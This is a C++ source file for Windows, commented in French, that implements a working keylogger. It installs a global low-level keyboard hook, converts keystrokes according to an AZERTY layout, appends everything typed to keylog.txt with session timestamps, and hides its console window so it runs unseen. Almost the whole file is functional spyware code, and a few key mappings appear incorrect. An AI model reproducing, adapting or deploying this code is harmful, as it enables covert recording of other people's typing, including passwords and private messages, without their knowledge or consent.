#include <windows.h>
#include <fstream>
#include <ctime>
#include <string>

// Chemin pour stocker les frappes
const char* logFilePath = "keylog.txt";

// Fonction pour vérifier l'état des touches (Shift, Caps Lock)
bool isKeyPressed(int key) {
    return (GetKeyState(key) & 0x8000) != 0;
}

// Fonction pour obtenir l'heure actuelle
std::string getCurrentTime() {
    time_t now = time(0);
    tm* ltm = localtime(&now);
    char buffer[80];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", ltm);
    return std::string(buffer);
}

// Fonction pour convertir les touches en texte lisible
std::string getKeyText(int key, DWORD scanCode) {
    bool shiftPressed = isKeyPressed(VK_LSHIFT);
    bool altPressed = isKeyPressed(VK_RMENU);
    bool capsLockActive = (GetKeyState(VK_CAPITAL) & 1) != 0;

    // Gestion des lettres
    if (key >= 'A' && key <= 'Z') {
        if (shiftPressed ^ capsLockActive) {
            return std::string(1, char(key)); // Majuscule
        } else {
            return std::string(1, char(key + 32)); // Minuscule
        }
    }

    // Gestion des chiffres et caractères spéciaux (clavier AZERTY)
    if (key >= '0' && key <= '9') {
        if (!shiftPressed) {
            switch (key) {
                case '1': return "&";
                case '2': return altPressed ? "~" : "é";
                case '3': return altPressed ? "#" : "\"";
                case '4': return altPressed ? "{" : "'";
                case '5': return altPressed ? "[" : "(";
                case '6': return altPressed ? "|" : "-";
                case '7': return altPressed ? "`" : "è";
                case '8': return altPressed ? "\\" : "_";
                case '9': return altPressed ? "^" :"ç";
                case '0': return altPressed ? "@" : "à";  // OK en AZERTY
            }
        }
        return std::string(1, char(key));  // En AZERTY sans Shift
    }

    // Gestion des touches spéciales
    switch (key) {
        case VK_BACK: return "[BACKSPACE]";
        case VK_RETURN: return "[ENTER]";
        case VK_SPACE: return " ";
        case VK_TAB: return "[TAB]";
        case VK_LSHIFT: return "[LSHIFT]";
        case VK_RMENU: return "[RALT]";
        case VK_ESCAPE: return "[ESC]";
        case VK_LMENU: return "[LALT]";
        case VK_RSHIFT: return "[RSHIFT]";
        case VK_LCONTROL: return "[LCTRL]";
        case VK_RCONTROL: return "[RCTRL]";
        case VK_OEM_1: return shiftPressed ? "£" : altPressed ? "¤" : "$";
        case VK_OEM_2: return shiftPressed ? "/" : ":";
        case VK_OEM_3: return shiftPressed ? "%" : "ù";
        case VK_OEM_4: return shiftPressed ? "°" : altPressed ? "]" : ")";
        case VK_OEM_5: return shiftPressed ? "µ" : "*";  // En AZERTY ces touches sont symétriques
        case VK_OEM_6: return shiftPressed ? "¨" : "^";
        case VK_OEM_7: return shiftPressed ? "" : "²";
        case VK_OEM_8: return shiftPressed ? "§" : "!";
        case VK_OEM_PLUS: return shiftPressed ? "+" : altPressed ? "}" : "=";
        case VK_OEM_COMMA: return shiftPressed ? "?" : ",";
        case VK_OEM_MINUS: return shiftPressed ? "_" : "-";
        case VK_OEM_PERIOD: return shiftPressed ? "." : ";";
        case VK_NUMPAD0: return "0";
        case VK_NUMPAD1: return "1";
        case VK_NUMPAD2: return "2";
        case VK_NUMPAD3: return "3";
        case VK_NUMPAD4: return "4";
        case VK_NUMPAD5: return "5";
        case VK_NUMPAD6: return "6";
        case VK_NUMPAD7: return "7";
        case VK_NUMPAD8: return "8";
        case VK_NUMPAD9: return "9";
        case VK_MULTIPLY: return "*";
        case VK_ADD: return "+";
        case VK_SUBTRACT: return "-";
        case VK_DIVIDE: return "/";
        case VK_DECIMAL: return ".";
        case VK_OEM_102: return shiftPressed ? ">" : "<";
        default: return ""; // Ignorer les autres touches
    }
}

// Fonction pour écrire les frappes dans un fichier
void logKeyStroke(int key, DWORD scanCode) {
    std::ofstream logFile;
    logFile.open(logFilePath, std::ios::app);
    std::string keyText = getKeyText(key, scanCode);
    if (!keyText.empty()) {
        logFile << keyText;
        if (keyText == "[ENTER]") {
            logFile << "\n"; // Saut de ligne après [ENTER]
        }
    }
    logFile.close();
}

// Fonction pour marquer le début d'une nouvelle session
void logSessionStart() {
    std::ofstream logFile;
    logFile.open(logFilePath, std::ios::app);
    logFile << "\n--- Nouvelle Session --- " << getCurrentTime() << "\n";
    logFile.close();
}

// Callback pour intercepter les frappes
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        int key = kbStruct->vkCode;
        DWORD scanCode = kbStruct->scanCode;
        logKeyStroke(kbStruct->vkCode, kbStruct->scanCode);  // Enregistrer la touche dans le fichier log
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Début d'une nouvelle session
    logSessionStart();

    // Installer le hook clavier global
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
    if (keyboardHook == NULL) {
        MessageBox(NULL, "Impossible d'installer le hook clavier.", "Erreur", MB_ICONERROR);
        return 1;
    }

    // Masquer la console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Boucle pour maintenir le programme en exécution
    MSG msg;
    while (true) {
        if (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(10);  // Ajouter un petit délai pour éviter une charge CPU excessive
    }

    // Libérer le hook avant de quitter
    UnhookWindowsHookEx(keyboardHook);

    return 0;
}